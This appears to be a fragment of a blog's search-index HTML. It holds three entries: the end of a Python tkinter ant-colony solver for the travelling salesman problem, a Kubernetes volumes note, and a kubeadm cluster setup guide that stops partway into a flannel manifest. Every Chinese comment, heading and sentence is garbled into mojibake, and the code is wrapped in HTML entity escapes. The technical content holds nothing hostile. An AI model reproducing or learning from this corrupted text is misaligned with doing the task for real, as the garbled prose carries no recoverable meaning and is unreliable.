        self.__clean_data()          # éšæœºåˆå§‹åŒ–å‡ºç”Ÿç‚¹

    # åˆå§‹æ•°æ®
    def __clean_data(self):

        self.path = []               # å½“å‰èš‚èšçš„è·¯å¾„           
        self.total_distance = 0.0    # å½“å‰è·¯å¾„çš„æ€»è·ç¦»
        self.move_count = 0          # ç§»åŠ¨æ¬¡æ•°
        self.current_city = -1       # å½“å‰åœç•™çš„åŸå¸‚
        self.open_table_city = [True for i in range(city_num)] # æ¢ç´¢åŸå¸‚çš„çŠ¶æ€

        city_index = random.randint(0,city_num-1) # éšæœºåˆå§‹å‡ºç”Ÿç‚¹
        self.current_city = city_index
        self.path.append(city_index)
        self.open_table_city[city_index] = False
        self.move_count = 1

    # é€‰æ‹©ä¸‹ä¸€ä¸ªåŸå¸‚
    def __choice_next_city(self):

        next_city = -1
        select_citys_prob = [0.0 for i in range(city_num)]  #å­˜å‚¨å»ä¸‹ä¸ªåŸå¸‚çš„æ¦‚ç‡
        total_prob = 0.0

        # è·å–å»ä¸‹ä¸€ä¸ªåŸå¸‚çš„æ¦‚ç‡
        for i in range(city_num):
            if self.open_table_city[i]:
                try :
                    # è®¡ç®—æ¦‚ç‡ï¼šä¸ä¿¡æ¯ç´ æµ“åº¦æˆæ­£æ¯”ï¼Œä¸è·ç¦»æˆåæ¯”
                    select_citys_prob[i] = pow(pheromone_graph[self.current_city][i], ALPHA) * pow((1.0/distance_graph[self.current_city][i]), BETA)
                    total_prob += select_citys_prob[i]
                except ZeroDivisionError as e:
                    print (&#39;Ant ID: {ID}, current city: {current}, target city: {target}&#39;.format(ID = self.ID, current = self.current_city, target = i))
                    sys.exit(1)

        # è½®ç›˜é€‰æ‹©åŸå¸‚
        if total_prob &amp;gt; 0.0:
            # äº§ç”Ÿä¸€ä¸ªéšæœºæ¦‚ç‡,0.0-total_prob
            temp_prob = random.uniform(0.0, total_prob)
            for i in range(city_num):
                if self.open_table_city[i]:
                    # è½®æ¬¡ç›¸å‡
                    temp_prob -= select_citys_prob[i]
                    if temp_prob &amp;lt; 0.0:
                        next_city = i
                        break

        # æœªä»æ¦‚ç‡äº§ç”Ÿï¼Œé¡ºåºé€‰æ‹©ä¸€ä¸ªæœªè®¿é—®åŸå¸‚
        # if next_city == -1:
        #     for i in range(city_num):
        #         if self.open_table_city[i]:
        #             next_city = i
        #             break

        if (next_city == -1):
            next_city = random.randint(0, city_num - 1)
            while ((self.open_table_city[next_city]) == False):  # if==False,è¯´æ˜å·²ç»éå†è¿‡äº†
                next_city = random.randint(0, city_num - 1)

        # è¿”å›ä¸‹ä¸€ä¸ªåŸå¸‚åºå·
        return next_city

    # è®¡ç®—è·¯å¾„æ€»è·ç¦»
    def __cal_total_distance(self):

        temp_distance = 0.0

        for i in range(1, city_num):
            start, end = self.path[i], self.path[i-1]
            temp_distance += distance_graph[start][end]

        # å›è·¯
        end = self.path[0]
        temp_distance += distance_graph[start][end]
        self.total_distance = temp_distance


    # ç§»åŠ¨æ“ä½œ
    def __move(self, next_city):

        self.path.append(next_city)
        self.open_table_city[next_city] = False
        self.total_distance += distance_graph[self.current_city][next_city]
        self.current_city = next_city
        self.move_count += 1

    # æœç´¢è·¯å¾„
    def search_path(self):

        # åˆå§‹åŒ–æ•°æ®
        self.__clean_data()

        # æœç´ è·¯å¾„ï¼Œéå†å®Œæ‰€æœ‰åŸå¸‚ä¸ºæ­¢
        while self.move_count &amp;lt; city_num:
            # ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªåŸå¸‚
            next_city =  self.__choice_next_city()
            self.__move(next_city)

        # è®¡ç®—è·¯å¾„æ€»é•¿åº¦
        self.__cal_total_distance()

#----------- TSPé—®é¢˜ -----------

class TSP(object):

    def __init__(self, root, width = 800, height = 600, n = city_num):

        # åˆ›å»ºç”»å¸ƒ
        self.root = root                               
        self.width = width      
        self.height = height
        # åŸå¸‚æ•°ç›®åˆå§‹åŒ–ä¸ºcity_num
        self.n = n
        # tkinter.Canvas
        self.canvas = tkinter.Canvas(
                root,
                width = self.width,
                height = self.height,
                bg = &amp;quot;#EBEBEB&amp;quot;,             # èƒŒæ™¯ç™½è‰² 
                xscrollincrement = 1,
                yscrollincrement = 1
            )
        self.canvas.pack(expand = tkinter.YES, fill = tkinter.BOTH)
        self.title(&amp;quot;TSPèšç¾¤ç®—æ³•(n:åˆå§‹åŒ– e:å¼€å§‹æœç´¢ s:åœæ­¢æœç´¢ q:é€€å‡ºç¨‹åº)&amp;quot;)
        self.__r = 5
        self.__lock = threading.RLock()     # çº¿ç¨‹é”

        self.__bindEvents()
        self.new()

        # è®¡ç®—åŸå¸‚ä¹‹é—´çš„è·ç¦»
        for i in range(city_num):
            for j in range(city_num):
                temp_distance = pow((distance_x[i] - distance_x[j]), 2) + pow((distance_y[i] - distance_y[j]), 2)
                temp_distance = pow(temp_distance, 0.5)
                distance_graph[i][j] =float(int(temp_distance + 0.5))

    # æŒ‰é”®å“åº”ç¨‹åº
    def __bindEvents(self):

        self.root.bind(&amp;quot;q&amp;quot;, self.quite)        # é€€å‡ºç¨‹åº
        self.root.bind(&amp;quot;n&amp;quot;, self.new)          # åˆå§‹åŒ–
        self.root.bind(&amp;quot;e&amp;quot;, self.search_path)  # å¼€å§‹æœç´¢
        self.root.bind(&amp;quot;s&amp;quot;, self.stop)         # åœæ­¢æœç´¢

    # æ›´æ”¹æ ‡é¢˜
    def title(self, s):

        self.root.title(s)

    # åˆå§‹åŒ–
    def new(self, evt = None):

        # åœæ­¢çº¿ç¨‹
        self.__lock.acquire()
        self.__running = False
        self.__lock.release()

        self.clear()     # æ¸…é™¤ä¿¡æ¯ 
        self.nodes = []  # èŠ‚ç‚¹åæ ‡
        self.nodes2 = [] # èŠ‚ç‚¹å¯¹è±¡

        # åˆå§‹åŒ–åŸå¸‚èŠ‚ç‚¹
        for i in range(len(distance_x)):
            # åœ¨ç”»å¸ƒä¸Šéšæœºåˆå§‹åæ ‡
            x = distance_x[i]
            y = distance_y[i]
            self.nodes.append((x, y))
            # ç”ŸæˆèŠ‚ç‚¹æ¤­åœ†ï¼ŒåŠå¾„ä¸ºself.__r
            node = self.canvas.create_oval(x - self.__r,
                    y - self.__r, x + self.__r, y + self.__r,
                    fill = &amp;quot;#ff0000&amp;quot;,      # å¡«å……çº¢è‰²
                    outline = &amp;quot;#000000&amp;quot;,   # è½®å»“ç™½è‰²
                    tags = &amp;quot;node&amp;quot;,
                )
            self.nodes2.append(node)
            # æ˜¾ç¤ºåæ ‡
            self.canvas.create_text(x,y-10,              # ä½¿ç”¨create_textæ–¹æ³•åœ¨åæ ‡ï¼ˆ302ï¼Œ77ï¼‰å¤„ç»˜åˆ¶æ–‡å­—
                    text = &#39;(&#39;+str(x)+&#39;,&#39;+str(y)+&#39;)&#39;,    # æ‰€ç»˜åˆ¶æ–‡å­—çš„å†…å®¹
                    fill = &#39;black&#39;                       # æ‰€ç»˜åˆ¶æ–‡å­—çš„é¢œè‰²ä¸ºç°è‰²
                )

        # é¡ºåºè¿æ¥åŸå¸‚
        #self.line(range(city_num))

        # åˆå§‹åŸå¸‚ä¹‹é—´çš„è·ç¦»å’Œä¿¡æ¯ç´ 
        for i in range(city_num):
            for j in range(city_num):
                pheromone_graph[i][j] = 1.0

        self.ants = [Ant(ID) for ID in range(ant_num)]  # åˆå§‹èšç¾¤
        self.best_ant = Ant(-1)                          # åˆå§‹æœ€ä¼˜è§£
        self.best_ant.total_distance = 1 &amp;lt;&amp;lt; 31           # åˆå§‹æœ€å¤§è·ç¦»
        self.iter = 1                                    # åˆå§‹åŒ–è¿­ä»£æ¬¡æ•° 

    # å°†èŠ‚ç‚¹æŒ‰orderé¡ºåºè¿çº¿
    def line(self, order):
        # åˆ é™¤åŸçº¿
        self.canvas.delete(&amp;quot;line&amp;quot;)
        def line2(i1, i2):
            p1, p2 = self.nodes[i1], self.nodes[i2]
            self.canvas.create_line(p1, p2, fill = &amp;quot;#000000&amp;quot;, tags = &amp;quot;line&amp;quot;)
            return i2

        # order[-1]ä¸ºåˆå§‹å€¼
        reduce(line2, order, order[-1])

    # æ¸…é™¤ç”»å¸ƒ
    def clear(self):
        for item in self.canvas.find_all():
            self.canvas.delete(item)

    # é€€å‡ºç¨‹åº
    def quite(self, evt):
        self.__lock.acquire()
        self.__running = False
        self.__lock.release()
        self.root.destroy()
        print (u&amp;quot;\nç¨‹åºå·²é€€å‡º...&amp;quot;)
        sys.exit()

    # åœæ­¢æœç´¢
    def stop(self, evt):
        self.__lock.acquire()
        self.__running = False
        self.__lock.release()

    # å¼€å§‹æœç´¢
    def search_path(self, evt = None):

        # å¼€å¯çº¿ç¨‹
        self.__lock.acquire()
        self.__running = True
        self.__lock.release()

        while self.__running:
            # éå†æ¯ä¸€åªèš‚èš
            for ant in self.ants:
                # æœç´¢ä¸€æ¡è·¯å¾„
                ant.search_path()
                # ä¸å½“å‰æœ€ä¼˜èš‚èšæ¯”è¾ƒ
                if ant.total_distance &amp;lt; self.best_ant.total_distance:
                    # æ›´æ–°æœ€ä¼˜è§£
                    self.best_ant = copy.deepcopy(ant)
            # æ›´æ–°ä¿¡æ¯ç´ 
            self.__update_pheromone_gragh()
            print (u&amp;quot;è¿­ä»£æ¬¡æ•°ï¼š&amp;quot;,self.iter,u&amp;quot;æœ€ä½³è·¯å¾„æ€»è·ç¦»ï¼š&amp;quot;,int(self.best_ant.total_distance))
            # è¿çº¿
            self.line(self.best_ant.path)
            # è®¾ç½®æ ‡é¢˜
            self.title(&amp;quot;TSPèšç¾¤ç®—æ³•(n:éšæœºåˆå§‹ e:å¼€å§‹æœç´¢ s:åœæ­¢æœç´¢ q:é€€å‡ºç¨‹åº) è¿­ä»£æ¬¡æ•°: %d&amp;quot; % self.iter)
            # æ›´æ–°ç”»å¸ƒ
            self.canvas.update()
            self.iter += 1

    # æ›´æ–°ä¿¡æ¯ç´ 
    def __update_pheromone_gragh(self):

        # è·å–æ¯åªèš‚èšåœ¨å…¶è·¯å¾„ä¸Šç•™ä¸‹çš„ä¿¡æ¯ç´ 
        temp_pheromone = [[0.0 for col in range(city_num)] for raw in range(city_num)]
        for ant in self.ants:
            for i in range(1,city_num):
                start, end = ant.path[i-1], ant.path[i]
                # åœ¨è·¯å¾„ä¸Šçš„æ¯ä¸¤ä¸ªç›¸é‚»åŸå¸‚é—´ç•™ä¸‹ä¿¡æ¯ç´ ï¼Œä¸è·¯å¾„æ€»è·ç¦»åæ¯”
                temp_pheromone[start][end] += Q / ant.total_distance
                temp_pheromone[end][start] = temp_pheromone[start][end]

        # æ›´æ–°æ‰€æœ‰åŸå¸‚ä¹‹é—´çš„ä¿¡æ¯ç´ ï¼Œæ—§ä¿¡æ¯ç´ è¡°å‡åŠ ä¸Šæ–°è¿­ä»£ä¿¡æ¯ç´ 
        for i in range(city_num):
            for j in range(city_num):
                pheromone_graph[i][j] = pheromone_graph[i][j] * RHO + temp_pheromone[i][j]

    # ä¸»å¾ªç¯
    def mainloop(self):
        self.root.mainloop()

#----------- ç¨‹åºçš„å…¥å£å¤„ -----------

if __name__ == &#39;__main__&#39;:


    TSP(tkinter.Tk()).mainloop()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;é—ä¼ ç®—æ³•&#34;&gt;é—ä¼ ç®—æ³•&lt;/h3&gt;
&lt;h3 id=&#34;å¾®ç²’ç¾¤ç®—æ³•&#34;&gt;å¾®ç²’ç¾¤ç®—æ³•&lt;/h3&gt;
">èšç¾¤ã€é—ä¼ ã€å¾®ç²’ç¾¤</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/k8s-juan/"" data-c="
          &lt;p&gt;k8sä¸­å·æ˜¯podçš„ä¸€ä¸ªç»„æˆéƒ¨åˆ†ï¼Œå®ƒä¸æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„å¯¹è±¡ï¼Œæ‰€ä»¥ä¸èƒ½å•ç‹¬åˆ›å»ºå’Œåˆ é™¤ã€‚&lt;br&gt;
podä¸­æ‰€æœ‰å®¹å™¨éƒ½å¯ä»¥ä½¿ç”¨å·ï¼Œä½†å¿…é¡»å…ˆå°†å®ƒæŒ‚è½½åœ¨æ¯ä¸ªéœ€è¦è®¿é—®å®ƒçš„å®¹å™¨ä¸­ã€‚&lt;br&gt;
æ¯ä¸ªå®¹å™¨å¯ä»¥åœ¨å…¶æ–‡ä»¶ç³»ç»Ÿçš„ä»»æ„ä½ç½®æŒ‚è½½å·ã€‚&lt;/p&gt;
&lt;p&gt;å¯åˆ›å»ºæŒ‚è½½çš„å·çš„ç±»å‹æœ‰å¤šç§ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;emptyDirï¼šç”¨äºå­˜å‚¨ä¸´æ—¶æ•°æ®çš„ç®€å•ç©ºç›®å½•ã€‚&lt;/li&gt;
&lt;li&gt;hostPathï¼šç”¨äºå°†ç›®å½•ä»å·¥ä½œèŠ‚ç‚¹çš„æ–‡ä»¶ç³»ç»ŸæŒ‚è½½åˆ°podä¸­ã€‚&lt;/li&gt;
&lt;li&gt;gitRepoï¼šé€šè¿‡æ£€å‡ºGitä»“åº“çš„å†…å®¹æ¥åˆå§‹åŒ–çš„å·ã€‚&lt;/li&gt;
&lt;li&gt;nfsï¼šæŒ‚è½½åˆ°podä¸­çš„NFSçš„å…±äº«å·ã€‚&lt;/li&gt;
&lt;li&gt;....&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;emptyDir&lt;/strong&gt;æ˜¯æœ€ç®€å•çš„å·ç±»å‹ï¼Œå…¶å®ƒç±»å‹éƒ½æ˜¯åœ¨å®ƒçš„åŸºç¡€ä¸Šæ„å»ºçš„ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-yaml&#34;&gt;volumes:
- name: name
  emptyDir: {}
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;&lt;strong&gt;gitRepo&lt;/strong&gt;å·åŸºæœ¬ä¸Šä¹Ÿæ˜¯ä¸€ä¸ªemptyDirå·ï¼Œå®ƒé€šè¿‡å…‹éš†Gitä»“åº“å¹¶åœ¨podå¯åŠ¨æ—¶(ä½†åœ¨å®¹å™¨åˆ›å»ºå‰)æ£€å‡ºç‰¹å®šç‰ˆæœ¬æ¥å¡«å……æ•°æ®ã€‚ä½†ä¸ä¼šè·Ÿç€Gitä»“åº“çš„ä»£ç åŒæ­¥æ›´æ–°ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-yaml&#34;&gt;volumes:
- name: html
  gitRepo:
    repository: https://gihub.com//....
    revision: master
    directory: . # å°†repoå…‹éš†åˆ°å·çš„æ ¹ç›®å½•
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;hostPath&lt;/strong&gt;ä¸€èˆ¬æ˜¯ç”±æŸäº›ç³»ç»Ÿçº§çš„podè¿›è¡Œè®¿é—®ï¼Œä¸€èˆ¬æ™®é€šä¸šåŠ¡podä¸åº”è¯¥å»æ“ä½œå®¿ä¸»æœºä¸Šçš„æ–‡ä»¶ç³»ç»Ÿã€‚è¿™ç§ç±»å‹çš„å·ä¸ä¼šéšç€podçš„åˆ é™¤è€Œåˆ é™¤ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;åˆ°ç°åœ¨ä¸ºæ­¢å…¶å®æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯ä¸Šé¢çš„çš„å­˜å‚¨å·ç±»å‹è¦ä¹ˆæ˜¯ä¼šéšç€podçš„åˆ é™¤è€Œåˆ é™¤ï¼Œè¦ä¹ˆå°±æ˜¯åªç»‘å®šåˆ°podæ‰€åœ¨çš„å®¿ä¸»æœºä¸Šï¼Œä¸€æ—¦podå‘ç”Ÿæ¼‚ç§»ï¼Œé‚£ä¹ˆæ•°æ®å°±ä¼šæ‰¾ä¸åˆ°ï¼Œå› æ­¤å¿…é¡»å°†å…¶å­˜å‚¨åœ¨æŸç§ç±»å‹çš„ç½‘ç»œå­˜å‚¨(NAS)ä¸­ã€‚&lt;br&gt;
é¦–å…ˆåˆ›å»ºä¸€ä¸ªè¿è¡ŒMongoDBçš„podï¼Œå¹¶åˆ›å»ºé€‚å½“ç±»å‹çš„å·æŒ‚è½½åˆ°MongoDBå®¹å™¨ä¸­ã€‚è¿™é‡Œçš„é€‚å½“ç±»å‹çš„å·å¯ä»¥ç”¨GCEæŒä¹…ç£ç›˜ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-yaml&#34;&gt;volumes:
- name: mongodb-data # å·å
  gcePersisitentDisk: # å·ç±»å‹æ˜¯GCEæŒä¹…ç£ç›˜
    pdName: mongodb # æŒä¹…ç£ç›˜çš„åç§°å¿…é¡»ä¸å…ˆå‰åˆ›å»ºçš„å®é™…PDä¸€è‡´
    fsType: ext4 # æ–‡ä»¶ç³»ç»Ÿç±»å‹ä¸ºEXT4ï¼Œä¸€ç§linuxæ–‡ä»¶ç³»ç»Ÿ
containers:
- image: mongo
  name: mongodb
  volumeMounts:
  - name: mongodb-data # ä¸ä¸Šé¢çš„å·åä¸€è‡´
    mountPath: /data/db # MongoDBæ•°æ®å­˜æ”¾çš„è·¯å¾„
  ports:
  - containerPort: 27017
    protocol: TCP
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;podåŒ…å«ä¸€ä¸ªå®¹å™¨å’Œä¸€ä¸ªå·ï¼Œè¢«ä¹‹å‰åˆ›å»ºçš„GCEæŒä¹…ç£ç›˜æ”¯æŒã€‚å› ä¸ºMongoDBå°±æ˜¯åœ¨/data/dbä¸Šå­˜å‚¨æ•°æ®çš„ï¼Œæ‰€ä»¥å®¹å™¨ä¸­çš„å·ä¹Ÿè¦æŒ‚è½½åœ¨è¿™ä¸ªè·¯å¾„ä¸Šã€‚&lt;br&gt;
ç„¶åå…¶å®ƒpodé€šè¿‡å‘MongoDBæ•°æ®åº“æ·»åŠ æ–‡æ¡£æ¥å°†æ•°æ®å†™å…¥æŒä¹…åŒ–å­˜å‚¨ã€‚&lt;/p&gt;
">ã€k8sã€‘å·</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/k8s-k8s-huan-jing-da-jian/"" data-c="
          &lt;p&gt;kubeadmæ˜¯å®˜æ–¹ç¤¾åŒºæ¨å‡ºçš„ä¸€ä¸ªç”¨äºå¿«é€Ÿéƒ¨ç½²kubernetesé›†ç¾¤çš„å·¥å…·ã€‚&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªå·¥å…·èƒ½é€šè¿‡ä¸¤æ¡æŒ‡ä»¤å®Œæˆä¸€ä¸ªkubernetesé›†ç¾¤çš„éƒ¨ç½²ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# åˆ›å»ºä¸€ä¸ª Master èŠ‚ç‚¹
kubeadm init

# å°†ä¸€ä¸ª Node èŠ‚ç‚¹åŠ å…¥åˆ°å½“å‰é›†ç¾¤ä¸­
kubeadm join &amp;lt;MasterèŠ‚ç‚¹çš„IPå’Œç«¯å£ &amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;1-å®‰è£…è¦æ±‚&#34;&gt;1. å®‰è£…è¦æ±‚&lt;/h2&gt;
&lt;p&gt;åœ¨å¼€å§‹ä¹‹å‰ï¼Œéƒ¨ç½²Kubernetesé›†ç¾¤æœºå™¨éœ€è¦æ»¡è¶³ä»¥ä¸‹å‡ ä¸ªæ¡ä»¶ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ä¸€å°æˆ–å¤šå°æœºå™¨ï¼Œæ“ä½œç³»ç»Ÿ CentOS7.x-86_x64&lt;/li&gt;
&lt;li&gt;ç¡¬ä»¶é…ç½®ï¼š2GBæˆ–æ›´å¤šRAMï¼Œ2ä¸ªCPUæˆ–æ›´å¤šCPUï¼Œç¡¬ç›˜30GBæˆ–æ›´å¤š&lt;/li&gt;
&lt;li&gt;å¯ä»¥è®¿é—®å¤–ç½‘ï¼Œéœ€è¦æ‹‰å–é•œåƒï¼Œå¦‚æœæœåŠ¡å™¨ä¸èƒ½ä¸Šç½‘ï¼Œéœ€è¦æå‰ä¸‹è½½é•œåƒå¹¶å¯¼å…¥èŠ‚ç‚¹&lt;/li&gt;
&lt;li&gt;ç¦æ­¢swapåˆ†åŒº&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2-å‡†å¤‡ç¯å¢ƒ&#34;&gt;2. å‡†å¤‡ç¯å¢ƒ&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;è§’è‰²&lt;/th&gt;
&lt;th&gt;IP&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;master&lt;/td&gt;
&lt;td&gt;10.0.0.200&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;node1&lt;/td&gt;
&lt;td&gt;10.0.0.201&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;node2&lt;/td&gt;
&lt;td&gt;10.0.0.202&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;pre&gt;&lt;code&gt;# å…³é—­é˜²ç«å¢™
systemctl stop firewalld
systemctl disable firewalld

# å…³é—­selinux
sed -i &#39;s/enforcing/disabled/&#39; /etc/selinux/config  # æ°¸ä¹…
setenforce 0  # ä¸´æ—¶

# å…³é—­swap
swapoff -a  # ä¸´æ—¶
sed -ri &#39;s/.*swap.*/#&amp;amp;/&#39; /etc/fstab    # æ°¸ä¹…

# æ ¹æ®è§„åˆ’è®¾ç½®ä¸»æœºå
# master
hostnamectl set-hostname master
# node1
hostnamectl set-hostname node1
# node2
hostnamectl set-hostname node2

# åœ¨masteræ·»åŠ hosts
cat &amp;gt;&amp;gt; /etc/hosts &amp;lt;&amp;lt; EOF
10.0.0.200 master
10.0.0.201 node1
10.0.0.202 node2
EOF

# å°†æ¡¥æ¥çš„IPv4æµé‡ä¼ é€’åˆ°iptablesçš„é“¾
cat &amp;gt; /etc/sysctl.d/k8s.conf &amp;lt;&amp;lt; EOF
net.bridge.bridge-nf-call-ip6tables = 1
net.bridge.bridge-nf-call-iptables = 1
EOF
sysctl --system  # ç”Ÿæ•ˆ

# æ—¶é—´åŒæ­¥
yum install ntpdate -y
ntpdate time.windows.com
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;3-æ‰€æœ‰èŠ‚ç‚¹å®‰è£…dockerkubeadmkubelet&#34;&gt;3. æ‰€æœ‰èŠ‚ç‚¹å®‰è£…Docker/kubeadm/kubelet&lt;/h2&gt;
&lt;p&gt;Kubernetesé»˜è®¤CRIï¼ˆå®¹å™¨è¿è¡Œæ—¶ï¼‰ä¸ºDockerï¼Œå› æ­¤å…ˆå®‰è£…Dockerã€‚&lt;/p&gt;
&lt;h3 id=&#34;31-å®‰è£…docker&#34;&gt;3.1 å®‰è£…Docker&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;yum install -y wget
wget https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo -O /etc/yum.repos.d/docker-ce.repo

yum -y install docker
systemctl enable docker &amp;amp;&amp;amp; systemctl start docker
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;$ cat &amp;gt; /etc/docker/daemon.json &amp;lt;&amp;lt; EOF
{
  &amp;quot;registry-mirrors&amp;quot;: [&amp;quot;https://b9pmyelo.mirror.aliyuncs.com&amp;quot;]
}
EOF
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;32-æ·»åŠ é˜¿é‡Œäº‘yumè½¯ä»¶æº&#34;&gt;3.2 æ·»åŠ é˜¿é‡Œäº‘YUMè½¯ä»¶æº&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;$ cat &amp;gt; /etc/yum.repos.d/kubernetes.repo &amp;lt;&amp;lt; EOF
[kubernetes]
name=Kubernetes
baseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64
enabled=1
gpgcheck=0
repo_gpgcheck=0
gpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg
EOF
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;33-å®‰è£…kubeadmkubeletå’Œkubectl&#34;&gt;3.3 å®‰è£…kubeadmï¼Œkubeletå’Œkubectl&lt;/h3&gt;
&lt;p&gt;ç”±äºç‰ˆæœ¬æ›´æ–°é¢‘ç¹ï¼Œè¿™é‡Œå¯ä»¥æŒ‡å®šç‰ˆæœ¬å·éƒ¨ç½²ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# æŒ‡å®šç‰ˆæœ¬å·ï¼Œè‹¥ä¸æŒ‡å®šä¸ºlatest
# yum install -y kubelet-1.16.3 kubeadm-1.16.3 kubectl-1.16.3 

yum install -y kubelet kubeadm kubectl

systemctl enable kubelet &amp;amp;&amp;amp; systemctl start kubelet
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;4-éƒ¨ç½²kubernetes-master&#34;&gt;4. éƒ¨ç½²Kubernetes Master&lt;/h2&gt;
&lt;p&gt;åœ¨Masteræ‰§è¡Œã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;kubeadm init --apiserver-advertise-address=10.0.0.200 --image-repository registry.aliyuncs.com/google_containers --kubernetes-version v1.20.4 --service-cidr=10.96.0.0/12 --pod-network-cidr=10.244.0.0/16
  
  # --apiserver-advertise-address APIæœåŠ¡å™¨æ‰€å…¬å¸ƒçš„å…¶æ­£åœ¨ç›‘å¬çš„IPåœ°å€
  # --image-repository é€‰æ‹©ç”¨äºæ‹‰å–æ§åˆ¶å¹³é¢é•œåƒçš„å®¹å™¨ä»“åº“ï¼Œç”±äºé»˜è®¤æ‹‰å–é•œåƒåœ°å€k8s.gcr.ioå›½å†…æ— æ³•è®¿é—®ï¼Œè¿™é‡ŒæŒ‡å®šé˜¿é‡Œäº‘é•œåƒä»“åº“åœ°å€ã€‚
  # --kubernetes-version å¦‚æœä¸Šæ–¹å®‰è£…kubeletæ²¡æœ‰æŒ‡å®šç‰ˆæœ¬å·ï¼Œè¿™é‡Œä¹Ÿå¯ä¸æŒ‡å®šï¼Œéœ€è¦æ³¨æ„ä¸åŒç‰ˆæœ¬ä¹‹é—´çš„å…¼å®¹ï¼Œä¸å…¼å®¹ä¼šæœ‰æŠ¥é”™ï¼ŒæŒ‡å®šå…¼å®¹ç‰ˆæœ¬å³å¯ã€‚
  # --service-cidr ä¸ºæœåŠ¡çš„è™šæ‹Ÿ IP åœ°å€å¦å¤–æŒ‡å®š IP åœ°å€æ®µ
  # --pod-network-cidr æŒ‡æ˜ pod ç½‘ç»œå¯ä»¥ä½¿ç”¨çš„ IP åœ°å€æ®µã€‚
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;å¦‚æœæç¤ºæ‰¾ä¸åˆ°coredns:v1.8.0ï¼Œå°±å…ˆåœ¨kubeadm initååŠ  --ignore-preflight-errors=allå¿½ç•¥æŠ¥é”™ã€‚kubeadm initç»“æŸåï¼Œç»§ç»­åé¢çš„æ­¥éª¤ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ä½¿ç”¨kubectlå·¥å…·ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mkdir -p $HOME/.kube
sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config
sudo chown $(id -u):$(id -g) $HOME/.kube/config
$ kubectl get nodes
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;5-åŠ å…¥kubernetes-node&#34;&gt;5. åŠ å…¥Kubernetes Node&lt;/h2&gt;
&lt;p&gt;åœ¨Nodeæ‰§è¡Œã€‚&lt;/p&gt;
&lt;p&gt;å‘é›†ç¾¤æ·»åŠ æ–°èŠ‚ç‚¹ï¼Œæ‰§è¡Œåœ¨kubeadm initè¾“å‡ºçš„kubeadm joinå‘½ä»¤ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ kubeadm join 192.168.1.11:6443 --token esce21.q6hetwm8si29qxwn \
    --discovery-token-ca-cert-hash sha256:00603a05805807501d7181c3d60b478788408cfe6cedefedb1f97569708be9c5
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;é»˜è®¤tokenæœ‰æ•ˆæœŸä¸º24å°æ—¶ï¼Œå½“è¿‡æœŸä¹‹åï¼Œè¯¥tokenå°±ä¸å¯ç”¨äº†ã€‚è¿™æ—¶å°±éœ€è¦é‡æ–°åˆ›å»ºtokenï¼Œæ“ä½œå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;kubeadm token create --print-join-command
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;6-éƒ¨ç½²cniç½‘ç»œæ’ä»¶&#34;&gt;6. éƒ¨ç½²CNIç½‘ç»œæ’ä»¶&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;vi kube-flannel.yml

---
apiVersion: policy/v1beta1
kind: PodSecurityPolicy
metadata:
  name: psp.flannel.unprivileged
  annotations:
